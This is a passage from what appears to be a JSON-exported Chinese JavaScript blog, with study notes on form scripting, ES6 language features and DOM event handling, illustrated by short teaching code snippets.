当前字段失去焦点时触发 focus，当前字段获得焦点时触发 change，对input和textarea元素，在它们失去焦点且value值改变时触发，对于select元素，在其选项改变时触发。 文本框脚本在HTML中，有2种方式表现文本框，一种是使用input元素的单行文本框，另一种是使用textarea的多行文本框。单行文本框通过size属性可以指定文本框中能够显示的字符数，maxlength属性能指定文本框的最大字符数，value元素属性能设置初始值。多行文本框设置rows指定行数，cols指定列数，其初始值在元素之间。 两种文本框都可以通过value对象属性读取或设置，不建议用DOM的方法，即不要修改文本框的DOM值，因为对value属性的修改不一定反映到DOM中。 选择文本文本框都支持selet方法，用于选择文本框中的所有文本，调用此方法时浏览器（Opera除外）会将焦点设置到文本框上。 在选择了文本框中的文本时就会触发select事件，H5添加了两个属性selectionStart/selectionEnd，表示所选文本的范围（即开头和结尾的偏移量）。 IE8-提供另外一个版本document.selection对象，该对象保存整个文档范围内选择的文本信息，配合select事件即可获取用户选择的文本。 H5为选择文本框内的部分文本提供了setSelectionRange方法，该方法接收2个参数，要选择的第一个字符的索引，要选择的最后一个字符之后的字符索引，（类似substring的2个参数）。 IE8-则可使用createTextRange方法创建一个范围，然后使用collase方法将范围折叠，最后调用moveStart、moveEnd方法并传入字符索引。 过滤输入一个常见的场景就是过滤用户的输入，比如输入特定格式的数据。 屏蔽字符当需要输入的文本中包含或不包含某些字符时，可以通过监听keypress事件，阻止特定的字符编码,比如只允许输入数值：123456789EventUtil.addHandler(textbox, 'keypress', function(event)&#123; event = EventUtil.getEvent(event); var target = EventUtil.getTarget(event); var charCode = EventUtil.getcharCode(event); // 所有非数字的字符，以及Ctrl符合键 if( !/\\d/.test(String.fromCharCode(charCode)) &amp;&amp; charCode &gt; 9 &amp;&amp; !event.ctrlKey)&#123; EventUtil.preventDefault(event); &#125;&#125;); 操作剪贴板H5规范中有6个剪贴板事件： beforecopy, 在发生复制操作前触发 copy beforecut，在发生剪切操作前触发 cut beforepaste，在发生粘贴操作前触发 paste可以通过clipboardData对象访问剪贴板中的数据，在IE中该对象是window对象的属性，其他浏览器中该对象是event对象的属性。clipboardData对象有3个方法，getData、setData、clearData。 getData接收一个参数表示要取得的数据的格式，IE中可填’text’或’URL’,其他浏览器填写MIME类型，用’text/plain’。 setData接收2个参数，一个数据类型，一个是文本内容。 自动切换焦点配合文本框的maxlength属性，监听keyup事件，每当文本框内容达到最大字符数后就自动聚焦到下一个文本框。 H5约束验证APIH5新增了一些功能为了在表单提交前验证数据，但目前此功能由各浏览器自行实现，所以差异很大。 required属性，必填 type=”email”，type=”url”， type=”number” 其他如range、datetime、date、month、week、time等支持程度不一 pattern属性，用正则匹配文本 使用checkValidity方法检测表单某字段是否有效，该方法返回布尔值 控件的validity属性则返回一个对象，对象中每个属性都表示了对应字段为何有效/无效 novalidate属性，表示禁用验证，可以通过表单对象上对应的属性form.noValidate = true/false设置。 选择框脚本选择框是通过selcet和option元素创建的。在获取选择框的信息时，推荐通过原生DOM访问获取，而不通过getAttribute、nodeValue等方法。HTML DOM Select 对象、HTML DOM Option 对象 但在实际使用中，由于选择框无法设置样式，所以多采用自定义的选择框，原生选择框使用较少。 富文本编辑富文本编辑（WYSIWYG），在网页中编辑富文本内容，由IE最先引入而且成为事实标准。 本质就是在页面中嵌入一个包含空HTML的iframe，通过设置iframe的document.designMode属性，这个空白的HTML页面可以被编辑，而编辑对象则是该页面body元素的HTML代码，designMode属性有2个可能的值：’off’默认值，’on’，设置为off时，整个文档都可以编辑，然后就可以像文字处理软件一样编辑了。 而且可以为空白页面应用CSS样式，修改可编辑区字段的外观。 使用contenteditable属性另一种编辑富文本内容的方式是使用名为contenteditable的特殊属性，也由IE最先引入，它比iframe方法更好是因为其可以应用给页面中的任意元素，而且不需要iframe和js的配合。&lt;div id=&quot;richedit&quot; contentEditable&gt;可以通过元素的contentEditable属性打开/关闭编辑模式，值为字符串，’true’表示打开，’false’表示关闭，’inherit’表示从父元素继承（在contentEditable元素内可创建元素或删除元素）1richedit.contentEditable = 'true'; 操作富文本与iframe富文本编辑器交互的主要方式，就是使用document.execCommand方法，该方法可以对文档执行预定义的命令，而且可以应用大多数格式，接收3个参数：字符串（要执行命令名）、布尔值（表示浏览器是否应该为当前命令提供一个用户界面）、值（表示执行命令需要的值，若不必则为null，若需要则为特定类型即可）。 详细查看：document.execCommand 在富文本编辑器中，使用iframe的getSelection方法可以确定实际选择的文本，该方法是window对象的document对象，调用会返回当前选择文本的Selection对象。Selection对象 注：由于富文本编辑器其实并不是一个表单控件，所以需要显式获取所有HTML内容。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"},{"name":"form","slug":"form","permalink":"https://github.com/xmoyKING/tags/form/"}]},{"title":"ES6入门笔记","slug":"es6","date":"2016-09-01T02:16:12.000Z","updated":"2017-12-23T02:00:51.548Z","comments":true,"path":"2016/09/01/es6/","link":"","permalink":"https://github.com/xmoyKING/2016/09/01/es6/","excerpt":"","text":"主要参考自ECMAScript 6 入门， 记录一些偏僻而新颖的知识点。 let和const基本用法如果使用let，声明的变量仅在块级作用域内有效. for (let i = 0; i &lt; 10; i++) 在for循环中，JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量i时，就在上一轮循环的基础上进行计算。 for循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域。 不存在变量提升var命令会发生”变量提升“现象，即变量可以在声明之前使用，值为undefined。 let命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。 暂时性死区只要块级作用域内存在let命令，它所声明的变量就“绑定”（binding）这个区域，不再受外部的影响。 ES6 明确规定，如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。 总之，在代码块内，使用let命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”（temporal dead zone，简称 TDZ）。 ES6 规定暂时性死区和let、const语句不出现变量提升，主要是为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为。 暂时性死区的本质就是，只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量。 ES6 的块级作用域let实际上为 JavaScript 新增了块级作用域。块级作用域的出现，实际上使得获得广泛应用的立即执行函数表达式（IIFE）不再必要了。 ES6 明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。而实际上，在浏览器的 ES6 环境中，块级作用域内声明的函数，行为类似于var声明的变量。因为如果改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。 constconst声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。对于const来说，只声明不赋值，就会报错。 const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指针，const只能保证这个指针是固定的，至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。 ES6 声明变量的六种方法ES5 只有两种声明变量的方法：var命令和function命令。ES6 除了添加let和const命令，另外两种声明变量的方法：import命令和class命令。所以，ES6 一共有 6 种声明变量的方法。 顶层对象的属性顶层对象，在浏览器环境指的是window对象，在 Node 指的是global对象。ES5 之中，顶层对象的属性与全局变量是等价的。 ES6 为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从 ES6 开始，全局变量将逐步与顶层对象的属性脱钩。 变量的解构赋值ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。let [a, b, c] = [1, 2, 3];本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。 如果解构不成功，变量的值就等于undefined。 如果等号的右边不是可遍历的结构，那么将会报错。解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象。由于undefined和null无法转为对象，所以对它们进行解构赋值，都会报错。12345let &#123;toString: s&#125; = 123;s === Number.prototype.toString // truelet &#123;toString: s&#125; = true;s === Boolean.prototype.toString // true 只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。 默认值解构赋值允许指定默认值。ES6 内部使用严格相等运算符（===），判断一个位置是否有值。所以，如果一个数组成员不严格等于undefined，默认值是不会生效的。 如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。 对象的解构赋值对象的解构与数组有一个重要的不同。数组的元素是按次序排列的，变量的取值由它的位置决定；而对象的属性没有次序，变量必须与属性同名，才能取到正确的值。如果变量名与属性名不一致，必须写成下面这样。1234567let &#123; foo: baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // \"aaa\"// 上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。let obj = &#123; first: 'hello', last: 'world' &#125;;let &#123; first: f, last: l &#125; = obj;f // 'hello'l // 'world' 实际上，对象的解构赋值是下面形式的简写let { foo: foo, bar: bar } = { foo: &quot;aaa&quot;, bar: &quot;bbb&quot; }; 123456let x;&#123;x&#125; = &#123;x: 1&#125;; // SyntaxError: syntax error// 正确的写法let x;(&#123;x&#125; = &#123;x: 1&#125;); 因为 JavaScript 引擎会将{x}理解成一个代码块，从而发生语法错误。只有不将大括号写在行首，避免 JavaScript 将其解释为代码块，才能解决这个问题。 字符串的解构赋值字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。 字符串的扩展codePointAt方法是测试一个字符由两个字节还是由四个字节组成的最简单方法。 实例：模板编译通过模板字符串，生成正式模板的实例。若无法直接看懂程序，则可以通过单步调试查看变量值的变化。1234567891011121314151617181920212223242526272829303132333435363738function compile(template)&#123; const evalExpr = /&lt;%=(.+?)%&gt;/g; const expr = /&lt;%([\\s\\S]+?)%&gt;/g; template = template .replace(evalExpr, '`); \\n echo( $1 ); \\n echo(`') .replace(expr, '`); \\n $1 \\n echo(`'); template = 'echo(`' + template + '`);'; let script = `(function parse(data)&#123; let output = \"\"; function echo(html)&#123; output += html; &#125; $&#123; template &#125; return output; &#125;)`; return script;&#125;let template = `&lt;ul&gt; &lt;% for(let i=0; i &lt; data.supplies.length; i++) &#123; %&gt; &lt;li&gt;&lt;%= data.supplies[i] %&gt;&lt;/li&gt; &lt;% &#125; %&gt;&lt;/ul&gt;`;let parse = eval(compile(template));let innerHTML = parse(&#123; supplies: [ \"broom\", \"mop\", \"cleaner\" ] &#125;);console.log(innerHTML); template编译成一个字符串，即compile(template)。 然后会被eval解析为可执行函数，最后赋值给parse变量。 正则的扩展主要是对Unicode的支持和加入新的标志u,s,y 数值的扩展添加对八进制和二进制的新写法 parseInt和parseFloat改为Number的静态方法。 Number.EPSILON的实质是一个可以接受的最小误差范围。 函数的扩展函数参数的默认值作用域一旦设置了参数的默认值，函数进行声明初始化时，参数会形成一个单独的作用域（context）。等到初始化结束，这个作用域就会消失。这种语法行为，在不设置参数默认值时，是不会出现的。 rest 参数ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。它就是一个真正的数组，数组特有的方法都可以使用。 ES2016 规定只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。这样规定的原因是，函数内部的严格模式，同时适用于函数体和函数参数。但是，函数执行的时候，先执行函数参数，然后再执行函数体。这样就有一个不合理的地方，只有从函数体之中，才能知道参数是否应该以严格模式执行，但是参数却应该先于函数体执行。 箭头函数如果箭头函数不需要参数或需要多个参数，就使用一个圆括号代表参数部分。 如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来，并且使用return语句返回。 由于大括号被解释为代码块，所以如果箭头函数直接返回一个对象，必须在对象外面加上括号，否则会报错。 箭头函数有几个使用注意点。 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。 不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。 不可以使用yield命令，因此箭头函数不能用作 Generator 函数。 this指向的固定化，并不是因为箭头函数内部有绑定this的机制，实际原因是箭头函数根本没有自己的this，导致内部的this就是外层代码块的this。正是因为它没有this，所以也就不能用作构造函数。 双冒号运算符函数绑定运算符是并排的两个冒号（::），双冒号左边是一个对象，右边是一个函数。该运算符会自动将左边的对象，作为上下文环境（即this对象），绑定到右边的函数上面。123foo::bar;// 等同于bar.bind(foo); 尾调用优化尾调用由于是函数的最后一步操作，所以不需要保留外层函数的调用帧，因为调用位置、内部变量等信息都不会再用到了，只要直接用内层函数的调用帧，取代外层函数的调用帧就可以了。 这就叫做“尾调用优化”（Tail call optimization），即只保留内层函数的调用帧。如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”的意义。 尾递归的实现，往往需要改写递归函数，确保最后一步只调用自身。做到这一点的方法，就是把所有用到的内部变量改写成函数的参数。 尾递归优化的实现1234567891011121314151617181920212223242526272829function tco(f) &#123; var value; var active = false; var accumulated = []; return function accumulator() &#123; accumulated.push(arguments); if (!active) &#123; active = true; while (accumulated.length) &#123; value = f.apply(this, accumulated.shift()); &#125; active = false; return value; &#125; &#125;;&#125;var sum = tco(function(x, y) &#123; if (y &gt; 0) &#123; return sum(x + 1, y - 1) &#125; else &#123; return x &#125;&#125;);sum(1, 100000)// 100001 其中的关键是value的值直到最后返回前都是undefined，而最后需要返回的x的值一直是作为sum的第一个参数。所以，看似递归，其实每次调用sum返回的都是undefined。没搞懂的问题：针对sum方法，为何要使用while循环，改为if可以么？ 数组的扩展对…运算符的新用法，若只想将数组的各个元素当做函数参数（只接受逗号分隔的参数列表）传入，则可以取代apply的用法。 先添加的Array.from()和Array.of()方法基本用法。 Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象。 Array.of方法用于将一组值，转换为数组。这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载。它的行为非常统一。 数组的空位数组的空位指，数组的某一个位置没有任何值。比如，Array构造函数返回的数组都是空位。 ES5 对空位的处理，已经很不一致了，大多数情况下会忽略空位。 forEach(), filter(), every() 和some()都会跳过空位。 map()会跳过空位，但会保留这个值 join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。 ES6 则是明确将空位转为undefined。 对象的扩展Object.assign()方法的使用。 对象的扩展运算符扩展运算符的解构赋值，不能复制继承自原型对象的属性。 ProxyProxy 用于修改某些操作的默认行为,Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。 this 问题虽然 Proxy 可以代理针对目标对象的访问，但它不是目标对象的透明代理，即不做任何拦截的情况下，也无法保证与目标对象的行为一致。主要原因就是在 Proxy 代理的情况下，目标对象内部的this关键字会指向 Proxy 代理。 ReflectReflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API。Reflect对象的设计目的有这样几个。 （1） 将Object对象的一些明显属于语言内部的方法（比如Object.defineProperty），放到Reflect对象上。现阶段，某些方法同时在Object和Reflect对象上部署，未来的新方法将只部署在Reflect对象上。也就是说，从Reflect对象上可以拿到语言内部的方法。（2） 修改某些Object方法的返回结果，让其变得更合理。（3） 让Object操作都变成函数行为。某些Object操作是命令式，比如name in obj和delete obj[name]，而Reflect.has(obj, name)和Reflect.deleteProperty(obj, name)让它们变成了函数行为。（4）Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法。这就让Proxy对象可以方便地调用对应的Reflect方法，完成默认行为，作为修改行为的基础。也就是说，不管Proxy怎么修改默认行为，你总可以在Reflect上获取默认行为。 Iterator 和 for…of 循环Iterator接口是for…of循环能否使用的关键，也可以使用while循环遍历。 由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。 for…of Array.from() Map(), Set(), WeakMap(), WeakSet()（比如new Map([[‘a’,1],[‘b’,2]])） Promise.all() Promise.race() Generator 函数的异步应用Promise 对象就是为了”回调函数地狱”（callback hell）这个问题而提出的。它不是新的语法功能，而是一种新的写法，允许将回调函数的嵌套，改成链式调用。 Promise 的写法只是回调函数的改进，使用then方法以后，异步任务的两段执行看得更清楚了，除此以外，并无新意。 Promise 的最大问题是代码冗余，原来的任务被 Promise 包装了一下，不管什么操作，一眼看去都是一堆then，原来的语义变得很不清楚。 Class 的继承需要理清proto和prototype属性的关系，可参考： js中proto和prototype的区别和关系？ 同时ES6中可以对原生构造函数进行继承，如Array、String、Date等。 Module 的加载实现由于CommonJS(Node)规范和ES6 Module规范的差异，因为一个是静态导入一个是动态导入，最好不用混用，虽然其实可以相互调用。但有各种需要注意的地方。 使用 SystemJS，它是一个垫片库（polyfill），可以在浏览器内加载 ES6 模块、AMD 模块和 CommonJS 模块，将其转为 ES5 格式。它在后台调用的是 Google 的 Traceur 转码器。 编程风格全局常量和线程安全:在let和const之间，建议优先使用const，尤其是在全局环境，不应该设置变量，只应设置常量。 const优于let有几个原因。一个是const可以提醒阅读程序的人，这个变量不应该改变；另一个是const比较符合函数式编程思想，运算不改变值，只是新建值，而且这样也有利于将来的分布式运算；最后一个原因是 JavaScript 编译器会对const进行优化，所以多使用const，有利于提高程序的运行效率，也就是说let和const的本质区别，其实是编译器内部的处理不同。 对象尽量静态化，一旦定义，就不得随意添加新的属性。如果添加属性不可避免，要使用Object.assign方法。 使用扩展运算符（…）拷贝数组。使用 Array.from 方法，将类似数组的对象转为数组。 对象静态化的原因：因为若对象在运行过程中发生变化，则会在内存中进行重组，重组过程中需要遍历对象，查找各种属性，所以不建议破坏一个对象的原始结构。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"es6","slug":"es6","permalink":"https://github.com/xmoyKING/tags/es6/"}]},{"title":"JavaScript高级程序设计-20-事件","slug":"js-pro20","date":"2016-09-01T01:37:13.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/01/js-pro20/","link":"","permalink":"https://github.com/xmoyKING/2016/09/01/js-pro20/","excerpt":"","text":"js与HTML之间的交互是通过事件实现的。事件，就是文档或浏览器窗口中发生的一些特定的交互瞬间。可以同监听器（处理程序）来预定事件，以便时间发生时执行相应的代码，这种模式也被称为“观察者模式”，支持页面行为（js代码）与页面视图（HTML和JS代码）之间的松散耦合。 浏览器的事件系统相对比较复杂，DOM2级规范标准化了一些DOM事件，但规范本身没有涵盖所有的事件类型。BOM也支持一些事件，且这些事件与DOM事件间的关系不清晰，因为BOM事件直到H5才有一些标准化规范可遵循。DOM3的出现更增强了DOM事件API和复杂性。 事件流要明白页面的哪个部分获取哪个特定的事件，就要明白事件流，比如单击一个按钮，单击事件不仅仅发生在按钮上，在单击按钮时，也单击了按钮的容器，甚至单击了整个页面。 事件流描述的是从页面接收事件的顺序。但IE的事件流是事件冒泡流，而Netscape则是事件捕获流。所有现代浏览器（IE9+）都支持事件冒泡，所以一般使用事件冒泡。 事件冒泡IE的事件流叫事件冒泡（event bubbling），即事件开始时是由最具体的元素（文档中嵌套最深的那个节点）接收，然后逐级上传到较为不具体的节点（直到window）。 事件捕获Netscape的事件流叫事件捕获（event capturing），即与冒泡相反，最不具体的节点最先接收到事件，然后依次到最具体的节点。事件捕获的用意在于在事件到达预定目标前捕获它。 DOM事件流DOM2级事件规定的事件流包括3个阶段：捕获阶段，目标阶段，冒泡阶段。虽然规范要求捕获阶段不会涉及到目标，但多数支持DOM事件流的浏览器都实现了一个特定的行为，即在捕获阶段也能触发事件对象上的事件，结果就有2次在目标对象上操作事件的机会。 事件处理程序事件就是用户或浏览器自身执行的某种动作，如click、load、mouseover等都是事件。而响应某个事件的函数就是事件处理程序（或事件监听器），一般事件处理程序的名字以on开头，因此click事件处理程序就是onclick。 HTML事件处理程序某个元素支持的每种事件都可以使用一个与相应事件处理程序同名的HTML属性来指定，这个属性的值为js代码。例如单击按钮：1&lt;input type=\"button\" value=\"click me\" onclick=\"alert(1);\"/&gt; 注：此处的js代码由于在HTML代码中，所以不能使用未经转义的HTML语法字符，如&amp;、双引号、大于、小于号等。 事件处理程序中的代码在执行时，有权访问全局作用域中的任何代码。所以可以将其指定为执行某个全局函数，如此，代码执行时会被传入一个event参数，该event就是事件对象，若是函数，则函数中的this等于事件的目标元素。 但在HTML中指定事件处理程序有缺点： 存在时差问题，若用户在HTML元素触发事件时并不具备执行条件（如js文件为加载，变量还未定义等），此时可以将代码封在try-catch块中，将错误捕捉起来不要抛出。onclick=&quot;try{msg();}catch(ex){}&quot; 由于浏览器对标识符解析规则的差异，使用with扩展事件处理程序的作用域链会导致不同的结果（而且with语句不建议使用） HTML与js代码紧密耦合，比如要更换事件处理程序则需要改动至少2个地方。所以一般使用js指定事件处理程序。 DOM0级事件处理程序通过js指定事件处理程序的传统方式，就是将一个函数赋值给一个事件处理程序属性，这种方式非常简单，同时也具有跨浏览器的优势。 首先需要取得一个操作对象的引用，而每个元素（包括window和document）都有自己的事件处理程序，这些属性通常是小写的，如onclick，然后将这个属性值设置为一个函数即可，将属性值设置为null即可删除已指定的事件处理程序：123456var btn = document.getElementById('mybtn');btn.onclick = function()&#123; // ...&#125;btn.onclick = null; // 删除 DOM0级方法指定的事件处理程序被认为是元素的方法，因此，这时的事件处理程序是在元素的作用域中运行，即this等于事件的当前元素。以这种方式添加的事件处理程序会在事件流的冒泡阶段被处理。 DOM2级事件处理程序DOM2级事件处理程序定义了2个方法用于指定/删除事件处理程序：addEventListener/removeEventListener，所有的DOM节点都包含这两个方法，并且接收三个参数：要处理的事件名、事件处理函数、布尔值（true则表示在捕获阶段调用，false则表示在冒泡阶段调用）。1234var btn = document.getElementById('mybtn');btn.addEventListener('click',function()&#123; // ...&#125;, false); DOM2级事件处理程序作用域也是当前元素（同DOM0级事件处理程序一样），其最大的好处是可以添加多个同名事件处理函数（如两个click事件），按照添加的顺序触发。 但通过addEventListener添加的事件处理程序只能使用对应的removeEventListener来移除，移除时传入的参数与添加时一样（3个参数都必须相同），这意味着若第二个参数是匿名函数则无法移除，所以一定要给每一个事件处理函数命名。 大多数情况下，都将事件处理程序添加到事件流的冒泡阶段，这样可以最大限度兼容各种浏览器，若不是特殊情况，不建议在事件捕获阶段注册事件处理函数。 IE事件处理程序IE实现了与DOM类型的两个方法：attachEvent/detachEvent，这对方法接受相同的两个参数：事件处理程序名、事件处理函数。IE8-只支持事件冒泡，所以通过attachEvent添加的事件处理程序都会被添加到冒泡阶段。 与DOM类型的区别： 方法名，attachEvent系列方法的第一个参数名是带on前缀的，比如“onclick”，而addEventListener则是“click”。 函数的作用域，DOM0级方法情况中，作用域为所属元素。而IE情况下，作用域为全局作用域，因此this等于window。 触发顺序，以相反的顺序被触发 跨浏览器的事件处理程序要保证处理事件代码在大多数浏览器下保持一致则只能关注冒泡阶段，同时需要检测浏览器并视情况使用DOM0、DOM2、IE等方法来添加事件。1234567891011121314151617181920var EventUtil = &#123; addHandler: function(e, type, handler)&#123; if(e.addEventListener)&#123; e.addEventListener(type, handler, false); &#125;else if(e.attachEvent)&#123; e.attachEvent('on'+type, handler); &#125;else&#123; e['on'+type] = handler; &#125; &#125;, removeHandler: function(e, type, handler)&#123; if(e.removeEventListener)&#123; e.removeEventListener(type, handler, false); &#125;else if(e.detachEvent)&#123; e.detachEvent('on'+type, handler); &#125;else&#123; e['on'+type] = null; &#125; &#125;&#125; 事件对象在触发DOM上的某个事件时，会产生一个事件对象event，这个对象中包含着所有与事件有关的信息，包括导致事件的元素，事件的类型、以及其他与特定事件相关的信息。例如，鼠标位置、按键信息等，但每个浏览器实现不太一致。 同时由于event对象包含特定事件相关的属性和方法，触发的事件类型不一样，可用的属性和方法也不一样。HTML DOM Event 对象 DOM中的事件对象兼容DOM的浏览器中，无论指定事件处理程序时使用什么方法（DOM0级或DOM2级）都会将一个event对象传入事件处理函数。123456789&lt;input type=\"button\" value=\"click me\" onclick=\"alert(event.type)\"/&gt; btn.onclick = function(event)&#123; // 此处的event用其他变量名也可以 event.type; // ...&#125;btn.addEventListener('click',function(event)&#123; event.type; // ...&#125;, false); 在事件处理函数内部，对象this始终等于currentTarget的值，而target则只包含事件的实际目标，若直接将事件处理程序指定给目标元素，则this，currentTarget、target包含相同的值。 通过type属性，则可以在一个函数中处理多个事件。 要阻止默认行为（如a标签的跳转行为）则可以使用preventDefault方法（只有cancelable为true时才可使用）。 stopPropagation方法则可以阻止事件在DOM层次的传播，即取消进一步的事件捕获或冒泡，例如在按钮上调用，则会阻止触发document.body上注册的事件。 eventPhase属性可以用来确定事件当前所处的事件流的阶段，若在捕获阶段调用的事件处理程序则eventPhase为1，若在事件处理程序处于目标对象上则为2，若在冒泡阶段调用的事件处理程序则为3（注意，尽管“处于目标”阶段发生在冒泡阶段，但eventPhase仍然一直为2）：1234567891011btn.onclick = function(event)&#123; event.eventPhase; // 2&#125;document.body.addEventListener('click',function(event)&#123; event.eventPhase; // 1&#125;, true);document.body.onclick = function(event)&#123; event.eventPhase; // 3&#125; 只有在事件处理程序执行期间event对象才会存在，一旦事件处理程序执行完则event对象就会被销毁。 IE中的事件对象与访问DOM中的event对象不同，要访问IE中的event对象有几种不同的方式，取决于指定事件处理程序的方法。 使用DOM0级的方法添加事件处理程序时，event对象作为window对象的一个属性存在。 因为IE中事件处理程序的作用域是根据它的方法来确定的，所以不能认为this会始终等于事件目标，故最好使用event.srcElement比较好。123456789101112&lt;input type=\"button\" value=\"click me\" onclick=\"alert(event.type)\"/&gt; btn.onclick = function()&#123; var event = window.event; event.type; // 'click' event.srcElement === this; // true&#125;btn.attachEvent('onclick',function(event)&#123; event.type; // 也可以使用window.event event.srcElement === this; // false&#125;); 跨浏览器的事件对象虽然IE和DOM中的event对象不同，但IE中的event对象的全部信息和方法在DOM中都有只是实现方式不同，因此实现两种事件模型之间的映射非常容易。主要是4个属性：event对象、target对象、preventDefault方法、stopPropagation方法。 事件类型web浏览器中可能发生的事件有很多类型，不同的事件类型有不同的信息，DOM3级事件规定了如下几类事件： UI事件，当用户与页面上的元素交互时触发 焦点事件，当元素获得/失去焦点时触发 鼠标事件，当通过鼠标在页面上执行操作时触发 滚轮事件，当使用鼠标滚轮时触发 文本事件，当在文档中输入文本时触发 键盘事件，当用户通过键盘在页面上执行操作时触发 合成事件，当为IME（input method editor 输入法编辑器）输入字符时触发 变动（mutation）事件，当底层DOM结构发生变化时触发 变动名称事件，当元素或属性名变动时触发，此类事件已废弃除了上述事件，H5还定义了一些事件，同时一些浏览器在BOM，DOM中也实现了一些专有事件。 DOM3级事件模块在DOM2级事件模块基础上重新定义了这些事件，也添加了一些新事件，包括IE9在被的所有主流浏览器都支持DOM2和DOM3级事件。 UI事件UI事件指的是那些不一定与用户操作有关的事件，这些事件在DOM规范出现前以各种形式存在，为了向后兼容所以在DOM规范中保留。现有UI事件如下： DOMActivate， 表示元素已经被用户操作激活（通过鼠标或键盘），此事件在DOM3级事件中被废弃，不建议使用 load，当页面完全加载（包括图片、js、css文件）后在window上触发，当所有框架都记载完后在框架集上触发，当图像加载完后在img元素上触发，或当嵌入的内容加载完成后在object元素上触发 unload，与load相对，为卸载完成后触发 abort，当用户停止下载时，若嵌入的内容没有加载完则在object元素上触发 error，当发生js错误时window上面触发，当无法加载图像时img上触发，当无法嵌入内容时object元素上触发，当有框架无法加载时在框架集上触发 select，当用户选择文本框（input/textarea）中的一个或多个字符时触发 resize，当窗口或框架的大小变化时在window或框架上触发 scroll，当用户滚动内容时在该元素上触发，对整个页面而言则为body元素这一类的事件多与window对象或表单控件有关。所有事件（DOMActivate除外）都归为DOM2级事件中的HTML事件。 load事件load事件最常用的一种方式就是监听页面是否完成加载。通过js可以在window上监听此事件，DOM中，event.target值为document，但在IE中该事件的event对象中srcElement不存在。 一般的，因为HTML代码无法访问window元素，window上发生的任何事件都可以在body元素上通过相应的属性来指定，所以也可以在body元素上使用onload属性来触发，但这种方式仅仅只是为了保证向后兼容。首选还是js监听的方式。1234567EventUtil.addHandler(window, 'load', function(event)&#123; // ...&#125;);&lt;body onload=\"alert('Loaded');\"&gt; // ...&lt;/body&gt; 除了window上使用load事件之外，还可以在img元素，Image对象（new Image()的实例），script/link（非标准）等元素上使用。 unload事件与load对应的是unload事件，这个事件在文档被完全卸载后触发，只要用户从一个页面切换到另一个页面，就会发生unload事件，而此事件常用于清除引用，避免内存泄漏，与load事件类型，有两种指定事件处理程序的方式，一个是通过js注册unload事件，一个是body元素上的onunload属性。 注意，由于unload事件实在一切被卸载完成后才触发，因此页面加载后存在才生成的一些对象此时就不存在了，比如操作DOM节点或元素样式会报错。 此事件有问题，测试时未成功触发 resize事件当浏览器窗口被调整时就会触发resize事件（包括最大化/最小化，用户手动拉伸），而关于何时触发，不用浏览器不同的机制，Firefox是在用户停止调整时触发，而其他浏览器则每变化1像素则触发1次，因此谨慎在该事件处理函数中加入大量任务，因为函数会被频繁执行从而降低效率。 